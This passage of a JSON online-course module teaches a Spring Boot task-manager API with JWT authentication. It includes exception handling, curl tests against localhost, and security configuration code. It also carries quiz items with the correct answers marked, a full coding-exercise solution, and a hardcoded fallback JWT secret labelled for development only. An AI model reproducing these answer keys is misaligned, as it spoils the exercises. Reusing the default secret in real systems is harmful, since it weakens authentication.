            },
            {
              "type": "THEORY",
              "title": "Global Exception Handling",
              "content": "Proper error handling improves user experience and prevents exposing internal details.\n\n```java\n// com/taskmanager/exception/ResourceNotFoundException.java\npackage com.taskmanager.exception;\n\npublic class ResourceNotFoundException extends RuntimeException {\n    public ResourceNotFoundException(String message) {\n        super(message);\n    }\n}\n\n// com/taskmanager/exception/GlobalExceptionHandler.java\npackage com.taskmanager.exception;\n\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.validation.FieldError;\nimport org.springframework.web.bind.MethodArgumentNotValidException;\nimport org.springframework.web.bind.annotation.ExceptionHandler;\nimport org.springframework.web.bind.annotation.RestControllerAdvice;\n\nimport java.time.LocalDateTime;\nimport java.util.HashMap;\nimport java.util.Map;\n\n@RestControllerAdvice\npublic class GlobalExceptionHandler {\n    \n    @ExceptionHandler(ResourceNotFoundException.class)\n    public ResponseEntity<ErrorResponse> handleResourceNotFound(\n            ResourceNotFoundException ex) {\n        ErrorResponse error = new ErrorResponse(\n            HttpStatus.NOT_FOUND.value(),\n            ex.getMessage(),\n            LocalDateTime.now()\n        );\n        return ResponseEntity.status(HttpStatus.NOT_FOUND).body(error);\n    }\n    \n    @ExceptionHandler(MethodArgumentNotValidException.class)\n    public ResponseEntity<Map<String, Object>> handleValidationErrors(\n            MethodArgumentNotValidException ex) {\n        Map<String, String> fieldErrors = new HashMap<>();\n        for (FieldError error : ex.getBindingResult().getFieldErrors()) {\n            fieldErrors.put(error.getField(), error.getDefaultMessage());\n        }\n        \n        Map<String, Object> response = new HashMap<>();\n        response.put(\"status\", HttpStatus.BAD_REQUEST.value());\n        response.put(\"message\", \"Validation failed\");\n        response.put(\"errors\", fieldErrors);\n        response.put(\"timestamp\", LocalDateTime.now());\n        \n        return ResponseEntity.badRequest().body(response);\n    }\n    \n    @ExceptionHandler(Exception.class)\n    public ResponseEntity<ErrorResponse> handleGenericException(Exception ex) {\n        // Log the full exception for debugging\n        // logger.error(\"Unexpected error\", ex);\n        \n        ErrorResponse error = new ErrorResponse(\n            HttpStatus.INTERNAL_SERVER_ERROR.value(),\n            \"An unexpected error occurred\",  // Never expose details\n            LocalDateTime.now()\n        );\n        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(error);\n    }\n}\n\n// com/taskmanager/exception/ErrorResponse.java\npackage com.taskmanager.exception;\n\nimport java.time.LocalDateTime;\n\npublic class ErrorResponse {\n    private int status;\n    private String message;\n    private LocalDateTime timestamp;\n    \n    public ErrorResponse(int status, String message, LocalDateTime timestamp) {\n        this.status = status;\n        this.message = message;\n        this.timestamp = timestamp;\n    }\n    \n    // Getters\n    public int getStatus() { return status; }\n    public String getMessage() { return message; }\n    public LocalDateTime getTimestamp() { return timestamp; }\n}\n```\n\n@RestControllerAdvice catches exceptions from all controllers and converts them to proper HTTP responses. This centralizes error handling and ensures consistent error format across the API."
            },
            {
              "type": "KEY_POINT",
              "title": "Testing the API with curl or Postman",
              "content": "Before building the frontend, test your API thoroughly using curl or Postman.\n\nCreate a Task:\n```bash\ncurl -X POST http://localhost:8080/api/tasks \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer <your-jwt-token>\" \\\n  -d '{\n    \"title\": \"Learn Spring Boot\",\n    \"description\": \"Complete the capstone project\",\n    \"priority\": \"HIGH\",\n    \"dueDate\": \"2024-12-31\"\n  }'\n```\n\nExpected Response (201 Created):\n```json\n{\n  \"id\": 1,\n  \"title\": \"Learn Spring Boot\",\n  \"description\": \"Complete the capstone project\",\n  \"status\": \"PENDING\",\n  \"priority\": \"HIGH\",\n  \"dueDate\": \"2024-12-31\",\n  \"category\": null,\n  \"createdAt\": \"2024-01-15T10:30:00\",\n  \"updatedAt\": \"2024-01-15T10:30:00\"\n}\n```\n\nGet All Tasks (Paginated):\n```bash\ncurl http://localhost:8080/api/tasks?page=0&size=5 \\\n  -H \"Authorization: Bearer <your-jwt-token>\"\n```\n\nUpdate a Task:\n```bash\ncurl -X PUT http://localhost:8080/api/tasks/1 \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer <your-jwt-token>\" \\\n  -d '{\"title\": \"Updated Title\", \"status\": \"COMPLETED\"}'\n```\n\nDelete a Task:\n```bash\ncurl -X DELETE http://localhost:8080/api/tasks/1 \\\n  -H \"Authorization: Bearer <your-jwt-token>\"\n```\n\nExpected Response: 204 No Content (empty body)"
            },
            {
              "type": "WARNING",
              "title": "Common REST API Mistakes",
              "content": "Avoid these common mistakes when building REST APIs:\n\nMistake 1: Verbs in URLs\nWrong: POST /api/createTask\nRight: POST /api/tasks\n\nMistake 2: Inconsistent naming\nWrong: /api/tasks but /api/getCategories\nRight: /api/tasks and /api/categories\n\nMistake 3: Wrong HTTP methods\nWrong: GET /api/tasks/delete/1\nRight: DELETE /api/tasks/1\n\nMistake 4: Not using proper status codes\nWrong: Return 200 OK with {\"error\": \"Not found\"}\nRight: Return 404 Not Found with error body\n\nMistake 5: Exposing entity IDs for all operations\nWrong: GET /api/users/1/password\nRight: Do not expose password endpoint at all\n\nMistake 6: No pagination for list endpoints\nWrong: GET /api/tasks returns all 10,000 tasks\nRight: GET /api/tasks?page=0&size=20 with limits\n\nMistake 7: Returning entities instead of DTOs\nWrong: Return User entity (includes password hash)\nRight: Return UserResponse DTO (no password)\n\nMistake 8: No input validation\nWrong: Accept any input, let database fail\nRight: Validate with @Valid and return 400 for bad input"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "capstone-16-3-http-status",
              "title": "HTTP Status Codes",
              "description": "Choose the correct status code for each scenario.",
              "question": "A user tries to update a task that belongs to another user. What HTTP status code should the API return?",
              "options": [
                {
                  "id": "a",
                  "text": "400 Bad Request - the request data was invalid",
                  "isCorrect": false
                },
                {
                  "id": "b",
                  "text": "401 Unauthorized - the user is not logged in",
                  "isCorrect": false
                },
                {
                  "id": "c",
                  "text": "403 Forbidden - the user is logged in but not allowed to access this resource",
                  "isCorrect": false
                },
                {
                  "id": "d",
                  "text": "404 Not Found - the task was not found (for this user)",
                  "isCorrect": true
                }
              ],
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "capstone-16-3-pagination",
              "title": "Understanding Pagination",
              "description": "Test your understanding of Spring Data pagination.",
              "question": "A client requests GET /api/tasks?page=2&size=10. The database has 47 tasks total. What will the response's 'content' array contain?",
              "options": [
                {
                  "id": "a",
                  "text": "Tasks 1-10 (first page, ignoring page parameter)",
                  "isCorrect": false
                },
                {
                  "id": "b",
                  "text": "Tasks 11-20 (page 2 means second page)",
                  "isCorrect": false
                },
                {
                  "id": "c",
                  "text": "Tasks 21-30 (page is zero-indexed, so page=2 is the third page)",
                  "isCorrect": true
                },
                {
                  "id": "d",
                  "text": "Tasks 21-47 (all remaining tasks from page 2 onwards)",
                  "isCorrect": false
                }
              ],
              "difficulty": "intermediate"
            },
            {
              "type": "FREE_CODING",
              "id": "capstone-16-3-category-controller",
              "title": "Implement CategoryController",
              "description": "Create a CategoryController with CRUD endpoints following the patterns from TaskController.",
              "instructions": "Implement the CategoryController class with the following endpoints:\n1. GET /api/categories - List all categories for current user\n2. POST /api/categories - Create new category\n3. PUT /api/categories/{id} - Update category\n4. DELETE /api/categories/{id} - Delete category\n\nFollow the same patterns as TaskController: use DTOs, inject the authenticated user, return proper status codes.",
              "starterCode": "// Implement CategoryController\n// Follow the patterns from TaskController\n\n@RestController\n@RequestMapping(\"/api/categories\")\npublic class CategoryController {\n    \n    // TODO: Add constructor and dependencies\n    \n    // TODO: Implement CRUD endpoints\n    \n}",
              "solution": "@RestController\n@RequestMapping(\"/api/categories\")\npublic class CategoryController {\n    \n    private final CategoryService categoryService;\n    \n    public CategoryController(CategoryService categoryService) {\n        this.categoryService = categoryService;\n    }\n    \n    @GetMapping\n    public ResponseEntity<List<CategoryResponse>> getAllCategories(\n            @AuthenticationPrincipal User user) {\n        List<CategoryResponse> categories = categoryService.getCategoriesForUser(user);\n        return ResponseEntity.ok(categories);\n    }\n    \n    @GetMapping(\"/{id}\")\n    public ResponseEntity<CategoryResponse> getCategory(\n            @PathVariable Long id,\n            @AuthenticationPrincipal User user) {\n        CategoryResponse category = categoryService.getCategory(id, user);\n        return ResponseEntity.ok(category);\n    }\n    \n    @PostMapping\n    public ResponseEntity<CategoryResponse> createCategory(\n            @Valid @RequestBody CategoryRequest request,\n            @AuthenticationPrincipal User user) {\n        CategoryResponse created = categoryService.createCategory(request, user);\n        URI location = URI.create(\"/api/categories/\" + created.getId());\n        return ResponseEntity.created(location).body(created);\n    }\n    \n    @PutMapping(\"/{id}\")\n    public ResponseEntity<CategoryResponse> updateCategory(\n            @PathVariable Long id,\n            @Valid @RequestBody CategoryRequest request,\n            @AuthenticationPrincipal User user) {\n        CategoryResponse updated = categoryService.updateCategory(id, request, user);\n        return ResponseEntity.ok(updated);\n    }\n    \n    @DeleteMapping(\"/{id}\")\n    public ResponseEntity<Void> deleteCategory(\n            @PathVariable Long id,\n            @AuthenticationPrincipal User user) {\n        categoryService.deleteCategory(id, user);\n        return ResponseEntity.noContent().build();\n    }\n}",
              "language": "java",
              "testCases": [],
              "hints": [
                {
                  "level": 1,
                  "text": "Follow the exact pattern from TaskController - constructor injection, @AuthenticationPrincipal, ResponseEntity return types."
                },
                {
                  "level": 2,
                  "text": "Categories do not need pagination since users typically have fewer categories. Return List<CategoryResponse> instead of Page."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "capstone-lesson-4",
          "title": "Lesson 16.4: Authentication Implementation",
          "moduleId": "module-16",
          "order": 4,
          "estimatedMinutes": 60,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "Spring Security 6 Configuration Overview",
              "content": "Spring Security 6 brings significant changes from previous versions, adopting a more functional, lambda-based configuration style. Understanding these changes is crucial for building secure applications.\n\nThe Security Filter Chain:\nSpring Security works by intercepting HTTP requests through a chain of filters. Each filter performs a specific security function: authentication, authorization, CSRF protection, session management, and more. In Spring Security 6, we configure this chain using the SecurityFilterChain bean.\n\nKey Concepts:\n\n1. SecurityFilterChain: The primary configuration point. It defines which requests require authentication, which are public, and how authentication should work.\n\n2. AuthenticationManager: Coordinates authentication by delegating to AuthenticationProvider implementations. For username/password auth, it uses UserDetailsService to load user data.\n\n3. SecurityContext: Holds the Authentication object for the current request. After successful authentication, Spring stores the authenticated user here.\n\n4. OncePerRequestFilter: Base class for custom filters that should execute once per request. We extend this for our JWT authentication filter.\n\nChanges from Spring Security 5:\n- authorizeRequests() replaced with authorizeHttpRequests()\n- antMatchers() replaced with requestMatchers()\n- Lambda DSL is now preferred over chained method calls\n- WebSecurityConfigurerAdapter is deprecated; use SecurityFilterChain bean instead\n\nOur authentication flow:\n1. User sends credentials to /api/auth/login\n2. AuthController validates credentials via AuthService\n3. On success, JwtService generates a JWT token\n4. Client includes token in subsequent requests via Authorization header\n5. JwtAuthenticationFilter validates token and sets SecurityContext\n6. Controllers access authenticated user via @AuthenticationPrincipal"
            },
            {
              "type": "THEORY",
              "title": "SecurityFilterChain with JWT Setup",
              "content": "Let us configure Spring Security for JWT-based stateless authentication. This setup disables sessions and CSRF (appropriate for API-only backends) and registers our custom JWT filter.\n\n```java\n// com/taskmanager/config/SecurityConfig.java\npackage com.taskmanager.config;\n\nimport com.taskmanager.security.JwtAuthenticationFilter;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.http.HttpMethod;\nimport org.springframework.security.authentication.AuthenticationManager;\nimport org.springframework.security.authentication.AuthenticationProvider;\nimport org.springframework.security.authentication.dao.DaoAuthenticationProvider;\nimport org.springframework.security.config.annotation.authentication.configuration.AuthenticationConfiguration;\nimport org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;\nimport org.springframework.security.config.http.SessionCreationPolicy;\nimport org.springframework.security.core.userdetails.UserDetailsService;\nimport org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;\nimport org.springframework.security.crypto.password.PasswordEncoder;\nimport org.springframework.security.web.SecurityFilterChain;\nimport org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;\nimport org.springframework.web.cors.CorsConfiguration;\nimport org.springframework.web.cors.CorsConfigurationSource;\nimport org.springframework.web.cors.UrlBasedCorsConfigurationSource;\n\nimport java.util.Arrays;\nimport java.util.List;\n\n@Configuration\n@EnableWebSecurity\n@EnableMethodSecurity\npublic class SecurityConfig {\n\n    private final JwtAuthenticationFilter jwtAuthFilter;\n    private final UserDetailsService userDetailsService;\n\n    public SecurityConfig(JwtAuthenticationFilter jwtAuthFilter,\n                         UserDetailsService userDetailsService) {\n        this.jwtAuthFilter = jwtAuthFilter;\n        this.userDetailsService = userDetailsService;\n    }\n\n    @Bean\n    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {\n        http\n            .cors(cors -> cors.configurationSource(corsConfigurationSource()))\n            .csrf(AbstractHttpConfigurer::disable)\n            .sessionManagement(session -> \n                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))\n            .authorizeHttpRequests(auth -> auth\n                .requestMatchers(\"/api/auth/**\").permitAll()\n                .requestMatchers(HttpMethod.GET, \"/api/health\").permitAll()\n                .anyRequest().authenticated()\n            )\n            .authenticationProvider(authenticationProvider())\n            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);\n\n        return http.build();\n    }\n\n    @Bean\n    public CorsConfigurationSource corsConfigurationSource() {\n        CorsConfiguration configuration = new CorsConfiguration();\n        configuration.setAllowedOrigins(List.of(\"http://localhost:5173\"));\n        configuration.setAllowedMethods(Arrays.asList(\"GET\", \"POST\", \"PUT\", \"DELETE\", \"OPTIONS\"));\n        configuration.setAllowedHeaders(Arrays.asList(\"Authorization\", \"Content-Type\"));\n        configuration.setAllowCredentials(true);\n        \n        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();\n        source.registerCorsConfiguration(\"/**\", configuration);\n        return source;\n    }\n\n    @Bean\n    public AuthenticationProvider authenticationProvider() {\n        DaoAuthenticationProvider provider = new DaoAuthenticationProvider();\n        provider.setUserDetailsService(userDetailsService);\n        provider.setPasswordEncoder(passwordEncoder());\n        return provider;\n    }\n\n    @Bean\n    public AuthenticationManager authenticationManager(\n            AuthenticationConfiguration config) throws Exception {\n        return config.getAuthenticationManager();\n    }\n\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder();\n    }\n}\n```\n\nConfiguration Breakdown:\n- CORS: Allows requests from the React frontend running on port 5173\n- CSRF disabled: Not needed for stateless JWT authentication\n- SessionCreationPolicy.STATELESS: No HTTP sessions; every request must include a token\n- requestMatchers: /api/auth/** is public; everything else requires authentication\n- addFilterBefore: Our JWT filter runs before the default username/password filter"
            },
            {
              "type": "THEORY",
              "title": "JwtService for Token Generation and Validation",
              "content": "The JwtService handles all JWT operations: creating tokens, validating them, and extracting claims. We use the jjwt library (io.jsonwebtoken).\n\nFirst, add the dependency to your pom.xml:\n```xml\n<dependency>\n    <groupId>io.jsonwebtoken</groupId>\n    <artifactId>jjwt-api</artifactId>\n    <version>0.12.3</version>\n</dependency>\n<dependency>\n    <groupId>io.jsonwebtoken</groupId>\n    <artifactId>jjwt-impl</artifactId>\n    <version>0.12.3</version>\n    <scope>runtime</scope>\n</dependency>\n<dependency>\n    <groupId>io.jsonwebtoken</groupId>\n    <artifactId>jjwt-jackson</artifactId>\n    <version>0.12.3</version>\n    <scope>runtime</scope>\n</dependency>\n```\n\n```java\n// com/taskmanager/security/JwtService.java\npackage com.taskmanager.security;\n\nimport io.jsonwebtoken.Claims;\nimport io.jsonwebtoken.Jwts;\nimport io.jsonwebtoken.io.Decoders;\nimport io.jsonwebtoken.security.Keys;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.security.core.userdetails.UserDetails;\nimport org.springframework.stereotype.Service;\n\nimport javax.crypto.SecretKey;\nimport java.util.Date;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.function.Function;\n\n@Service\npublic class JwtService {\n\n    @Value(\"${jwt.secret}\")\n    private String secretKey;\n\n    @Value(\"${jwt.expiration:86400000}\")\n    private long jwtExpiration; // Default 24 hours\n\n    public String extractUsername(String token) {\n        return extractClaim(token, Claims::getSubject);\n    }\n\n    public <T> T extractClaim(String token, Function<Claims, T> claimsResolver) {\n        final Claims claims = extractAllClaims(token);\n        return claimsResolver.apply(claims);\n    }\n\n    public String generateToken(UserDetails userDetails) {\n        return generateToken(new HashMap<>(), userDetails);\n    }\n\n    public String generateToken(Map<String, Object> extraClaims, UserDetails userDetails) {\n        return Jwts.builder()\n                .claims(extraClaims)\n                .subject(userDetails.getUsername())\n                .issuedAt(new Date(System.currentTimeMillis()))\n                .expiration(new Date(System.currentTimeMillis() + jwtExpiration))\n                .signWith(getSigningKey(), Jwts.SIG.HS256)\n                .compact();\n    }\n\n    public boolean isTokenValid(String token, UserDetails userDetails) {\n        final String username = extractUsername(token);\n        return username.equals(userDetails.getUsername()) && !isTokenExpired(token);\n    }\n\n    private boolean isTokenExpired(String token) {\n        return extractExpiration(token).before(new Date());\n    }\n\n    private Date extractExpiration(String token) {\n        return extractClaim(token, Claims::getExpiration);\n    }\n\n    private Claims extractAllClaims(String token) {\n        return Jwts.parser()\n                .verifyWith(getSigningKey())\n                .build()\n                .parseSignedClaims(token)\n                .getPayload();\n    }\n\n    private SecretKey getSigningKey() {\n        byte[] keyBytes = Decoders.BASE64.decode(secretKey);\n        return Keys.hmacShaKeyFor(keyBytes);\n    }\n}\n```\n\nAdd JWT configuration to application.yml:\n```yaml\njwt:\n  secret: ${JWT_SECRET:dGhpcyBpcyBhIHZlcnkgbG9uZyBzZWNyZXQga2V5IGZvciBkZXZlbG9wbWVudCBvbmx5}\n  expiration: 86400000  # 24 hours in milliseconds\n```\n\nToken Structure:\n- Subject (sub): User's email (identifier)\n- IssuedAt (iat): When token was created\n- Expiration (exp): When token expires\n- Custom claims: Can add role, userId, etc."
            },
            {
              "type": "THEORY",
              "title": "JwtAuthenticationFilter Implementation",
              "content": "The JWT authentication filter intercepts every request, extracts the token from the Authorization header, validates it, and sets the authenticated user in the SecurityContext.\n\n```java\n// com/taskmanager/security/JwtAuthenticationFilter.java\npackage com.taskmanager.security;\n\nimport jakarta.servlet.FilterChain;\nimport jakarta.servlet.ServletException;\nimport jakarta.servlet.http.HttpServletRequest;\nimport jakarta.servlet.http.HttpServletResponse;\nimport org.springframework.lang.NonNull;\nimport org.springframework.security.authentication.UsernamePasswordAuthenticationToken;\nimport org.springframework.security.core.context.SecurityContextHolder;\nimport org.springframework.security.core.userdetails.UserDetails;\nimport org.springframework.security.core.userdetails.UserDetailsService;\nimport org.springframework.security.web.authentication.WebAuthenticationDetailsSource;\nimport org.springframework.stereotype.Component;\nimport org.springframework.web.filter.OncePerRequestFilter;\n\nimport java.io.IOException;\n\n@Component\npublic class JwtAuthenticationFilter extends OncePerRequestFilter {\n\n    private final JwtService jwtService;\n    private final UserDetailsService userDetailsService;\n\n    public JwtAuthenticationFilter(JwtService jwtService, \n                                   UserDetailsService userDetailsService) {\n        this.jwtService = jwtService;\n        this.userDetailsService = userDetailsService;\n    }\n\n    @Override\n    protected void doFilterInternal(\n            @NonNull HttpServletRequest request,\n            @NonNull HttpServletResponse response,\n            @NonNull FilterChain filterChain) throws ServletException, IOException {\n        \n        final String authHeader = request.getHeader(\"Authorization\");\n        \n        // No Authorization header or not Bearer token\n        if (authHeader == null || !authHeader.startsWith(\"Bearer \")) {\n            filterChain.doFilter(request, response);\n            return;\n        }\n\n        final String jwt = authHeader.substring(7); // Remove \"Bearer \" prefix\n        final String userEmail;\n        \n        try {\n            userEmail = jwtService.extractUsername(jwt);\n        } catch (Exception e) {\n            // Invalid token format\n            filterChain.doFilter(request, response);\n            return;\n        }\n\n        // User email extracted and not already authenticated\n        if (userEmail != null && SecurityContextHolder.getContext().getAuthentication() == null) {\n            UserDetails userDetails = this.userDetailsService.loadUserByUsername(userEmail);\n            \n            if (jwtService.isTokenValid(jwt, userDetails)) {\n                UsernamePasswordAuthenticationToken authToken = \n                    new UsernamePasswordAuthenticationToken(\n                        userDetails,\n                        null,\n                        userDetails.getAuthorities()\n                    );\n                authToken.setDetails(\n                    new WebAuthenticationDetailsSource().buildDetails(request)\n                );\n                SecurityContextHolder.getContext().setAuthentication(authToken);\n            }\n        }\n        \n        filterChain.doFilter(request, response);\n    }\n}\n```\n\nFilter Flow Explained:\n\n1. Extract Authorization header from request\n2. Skip filter if no header or not \"Bearer\" scheme\n3. Parse JWT and extract username (email)\n4. Load full user details from database\n5. Validate token (signature, expiration, user match)\n6. Create Authentication object and set in SecurityContext\n7. Continue filter chain\n\nAfter this filter runs successfully, controllers can access the authenticated user via @AuthenticationPrincipal or SecurityContextHolder.getContext().getAuthentication()."
            },
            {
              "type": "THEORY",
              "title": "AuthController: Register and Login Endpoints",
              "content": "The AuthController handles user registration and login. It delegates business logic to AuthService and uses JwtService for token generation.\n\n```java\n// com/taskmanager/dto/request/RegisterRequest.java\npackage com.taskmanager.dto.request;\n\nimport jakarta.validation.constraints.Email;\nimport jakarta.validation.constraints.NotBlank;\nimport jakarta.validation.constraints.Size;\n\npublic class RegisterRequest {\n    \n    @NotBlank(message = \"Email is required\")\n    @Email(message = \"Invalid email format\")\n    private String email;\n    \n    @NotBlank(message = \"Password is required\")\n    @Size(min = 8, message = \"Password must be at least 8 characters\")\n    private String password;\n    \n    @NotBlank(message = \"Name is required\")\n    @Size(min = 2, max = 100, message = \"Name must be 2-100 characters\")\n    private String name;\n    \n    // Getters and setters\n    public String getEmail() { return email; }\n    public void setEmail(String email) { this.email = email; }\n    public String getPassword() { return password; }\n    public void setPassword(String password) { this.password = password; }\n    public String getName() { return name; }\n    public void setName(String name) { this.name = name; }\n}\n\n// com/taskmanager/dto/request/LoginRequest.java\npackage com.taskmanager.dto.request;\n\nimport jakarta.validation.constraints.Email;\nimport jakarta.validation.constraints.NotBlank;\n\npublic class LoginRequest {\n    \n    @NotBlank(message = \"Email is required\")\n    @Email(message = \"Invalid email format\")\n    private String email;\n    \n    @NotBlank(message = \"Password is required\")\n    private String password;\n    \n    // Getters and setters\n    public String getEmail() { return email; }\n    public void setEmail(String email) { this.email = email; }\n    public String getPassword() { return password; }\n    public void setPassword(String password) { this.password = password; }\n}\n\n// com/taskmanager/dto/response/AuthResponse.java\npackage com.taskmanager.dto.response;\n\npublic class AuthResponse {\n    \n    private String token;\n    private String email;\n    private String name;\n    \n    public AuthResponse(String token, String email, String name) {\n        this.token = token;\n        this.email = email;\n        this.name = name;\n    }\n    \n    // Getters\n    public String getToken() { return token; }\n    public String getEmail() { return email; }\n    public String getName() { return name; }\n}\n\n// com/taskmanager/controller/AuthController.java\npackage com.taskmanager.controller;\n\nimport com.taskmanager.dto.request.LoginRequest;\nimport com.taskmanager.dto.request.RegisterRequest;\nimport com.taskmanager.dto.response.AuthResponse;\nimport com.taskmanager.service.AuthService;\nimport jakarta.validation.Valid;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.web.bind.annotation.*;\n\n@RestController\n@RequestMapping(\"/api/auth\")\npublic class AuthController {\n\n    private final AuthService authService;\n\n    public AuthController(AuthService authService) {\n        this.authService = authService;\n    }\n\n    @PostMapping(\"/register\")\n    public ResponseEntity<AuthResponse> register(\n            @Valid @RequestBody RegisterRequest request) {\n        AuthResponse response = authService.register(request);\n        return ResponseEntity.status(HttpStatus.CREATED).body(response);\n    }\n\n    @PostMapping(\"/login\")\n    public ResponseEntity<AuthResponse> login(\n            @Valid @RequestBody LoginRequest request) {\n        AuthResponse response = authService.login(request);\n        return ResponseEntity.ok(response);\n    }\n}\n```\n\nAPI Endpoints:\n- POST /api/auth/register - Create new user account, return JWT\n- POST /api/auth/login - Authenticate existing user, return JWT\n\nBoth endpoints return AuthResponse containing the JWT token, which the frontend stores and includes in subsequent requests."
            },
            {
              "type": "THEORY",
              "title": "AuthService and Password Encoding with BCrypt",
              "content": "The AuthService implements authentication business logic. It uses BCrypt for secure password hashing and JwtService for token generation.\n\n```java\n// com/taskmanager/service/AuthService.java\npackage com.taskmanager.service;\n\nimport com.taskmanager.dto.request.LoginRequest;\nimport com.taskmanager.dto.request.RegisterRequest;\nimport com.taskmanager.dto.response.AuthResponse;\nimport com.taskmanager.exception.DuplicateResourceException;\nimport com.taskmanager.model.User;\nimport com.taskmanager.model.enums.Role;\nimport com.taskmanager.repository.UserRepository;\nimport com.taskmanager.security.JwtService;\nimport org.springframework.security.authentication.AuthenticationManager;\nimport org.springframework.security.authentication.BadCredentialsException;\nimport org.springframework.security.authentication.UsernamePasswordAuthenticationToken;\nimport org.springframework.security.crypto.password.PasswordEncoder;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\n@Service\n@Transactional\npublic class AuthService {\n\n    private final UserRepository userRepository;\n    private final PasswordEncoder passwordEncoder;\n    private final JwtService jwtService;\n    private final AuthenticationManager authenticationManager;\n\n    public AuthService(UserRepository userRepository,\n                       PasswordEncoder passwordEncoder,\n                       JwtService jwtService,\n                       AuthenticationManager authenticationManager) {\n        this.userRepository = userRepository;\n        this.passwordEncoder = passwordEncoder;\n        this.jwtService = jwtService;\n        this.authenticationManager = authenticationManager;\n    }\n\n    public AuthResponse register(RegisterRequest request) {\n        // Check if email already exists\n        if (userRepository.existsByEmail(request.getEmail())) {\n            throw new DuplicateResourceException(\n                \"Email already registered: \" + request.getEmail());\n        }\n\n        // Create new user with hashed password\n        User user = new User();\n        user.setEmail(request.getEmail().toLowerCase().trim());\n        user.setPassword(passwordEncoder.encode(request.getPassword()));\n        user.setName(request.getName().trim());\n        user.setRole(Role.USER);\n\n        User savedUser = userRepository.save(user);\n\n        // Generate JWT token\n        String token = jwtService.generateToken(savedUser);\n\n        return new AuthResponse(token, savedUser.getEmail(), savedUser.getName());\n    }\n\n    public AuthResponse login(LoginRequest request) {\n        try {\n            // AuthenticationManager uses UserDetailsService and PasswordEncoder\n            authenticationManager.authenticate(\n                new UsernamePasswordAuthenticationToken(\n                    request.getEmail().toLowerCase().trim(),\n                    request.getPassword()\n                )\n            );\n        } catch (BadCredentialsException e) {\n            throw new BadCredentialsException(\"Invalid email or password\");\n        }\n\n        // If authentication succeeds, load user and generate token\n        User user = userRepository.findByEmail(request.getEmail().toLowerCase())\n                .orElseThrow(() -> new BadCredentialsException(\"Invalid email or password\"));\n\n        String token = jwtService.generateToken(user);\n\n        return new AuthResponse(token, user.getEmail(), user.getName());\n    }\n}\n\n// com/taskmanager/exception/DuplicateResourceException.java\npackage com.taskmanager.exception;\n\npublic class DuplicateResourceException extends RuntimeException {\n    public DuplicateResourceException(String message) {\n        super(message);\n    }\n}\n```\n\nBCrypt Password Security:\nBCrypt is the industry standard for password hashing:\n- One-way hash: Cannot reverse to get original password\n- Salt built-in: Each hash includes random salt, preventing rainbow table attacks\n- Work factor: Configurable computational cost (default 10) makes brute force expensive\n- Unique hashes: Same password produces different hash each time\n\nNever store plain text passwords! Always use passwordEncoder.encode() before saving and let AuthenticationManager handle comparison during login."
            },
            {
              "type": "THEORY",
              "title": "UserDetailsService Implementation",
              "content": "Spring Security requires a UserDetailsService to load user data during authentication. Our User entity must implement UserDetails interface.\n\n```java\n// Update com/taskmanager/model/User.java to implement UserDetails\npackage com.taskmanager.model;\n\nimport com.taskmanager.model.enums.Role;\nimport jakarta.persistence.*;\nimport org.springframework.security.core.GrantedAuthority;\nimport org.springframework.security.core.authority.SimpleGrantedAuthority;\nimport org.springframework.security.core.userdetails.UserDetails;\n\nimport java.time.LocalDateTime;\nimport java.util.ArrayList;\nimport java.util.Collection;\nimport java.util.List;\n\n@Entity\n@Table(name = \"users\")\npublic class User implements UserDetails {\n\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n\n    @Column(unique = true, nullable = false, length = 255)\n    private String email;\n\n    @Column(nullable = false)\n    private String password;\n\n    @Column(length = 100)\n    private String name;\n\n    @Enumerated(EnumType.STRING)\n    @Column(nullable = false)\n    private Role role = Role.USER;\n\n    @Column(name = \"created_at\", updatable = false)\n    private LocalDateTime createdAt;\n\n    @OneToMany(mappedBy = \"owner\", cascade = CascadeType.ALL, orphanRemoval = true)\n    private List<Task> tasks = new ArrayList<>();\n\n    @OneToMany(mappedBy = \"owner\", cascade = CascadeType.ALL, orphanRemoval = true)\n    private List<Category> categories = new ArrayList<>();\n\n    // UserDetails implementation\n    @Override\n    public Collection<? extends GrantedAuthority> getAuthorities() {\n        return List.of(new SimpleGrantedAuthority(\"ROLE_\" + role.name()));\n    }\n\n    @Override\n    public String getUsername() {\n        return email; // Use email as username\n    }\n\n    @Override\n    public boolean isAccountNonExpired() {\n        return true;\n    }\n\n    @Override\n    public boolean isAccountNonLocked() {\n        return true;\n    }\n\n    @Override\n    public boolean isCredentialsNonExpired() {\n        return true;\n    }\n\n    @Override\n    public boolean isEnabled() {\n        return true;\n    }\n\n    // Standard getters and setters\n    public Long getId() { return id; }\n    public void setId(Long id) { this.id = id; }\n    public String getEmail() { return email; }\n    public void setEmail(String email) { this.email = email; }\n    public String getPassword() { return password; }\n    public void setPassword(String password) { this.password = password; }\n    public String getName() { return name; }\n    public void setName(String name) { this.name = name; }\n    public Role getRole() { return role; }\n    public void setRole(Role role) { this.role = role; }\n    public LocalDateTime getCreatedAt() 